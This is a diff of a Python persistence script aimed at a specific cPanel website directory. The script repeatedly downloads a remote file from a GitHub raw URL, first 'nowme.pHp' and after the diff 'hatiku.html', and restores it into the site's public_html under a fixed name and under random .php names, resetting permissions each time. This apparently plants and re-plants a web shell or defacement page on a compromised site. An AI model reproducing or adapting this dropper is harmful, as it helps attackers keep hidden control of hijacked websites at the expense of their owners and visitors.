@@ -5,8 +5,8 @@ from urllib.request import urlopen
 import time
 import random
 import string
-paths_to_monitor = ['/cpaneldisk/home/greenshaktilife/public_html/tmb/']
-url = 'https://raw.githubusercontent.com/khmer99/sulap/refs/heads/main/nowme.pHp'
+paths_to_monitor = ['/cpaneldisk/home/greenshaktilife/public_html/']
+url = 'https://raw.githubusercontent.com/khmer99/sulap/refs/heads/main/hatiku.html'
 fixed_permission = 0o644
 def get_original_hash():
     response = urlopen(url)
@@ -27,7 +27,7 @@ def restore_file(file_path, is_main_dir):
     os.chmod(file_path, fixed_permission)
 def check_and_restore_files(directory, is_main_dir=False):
     if is_main_dir:
-        file_name = 'internship.php'
+        file_name = 'gallery.html'
     else:
         file_name = f"{generate_random_name()}.php"
     file_path = os.path.join(directory, file_name)
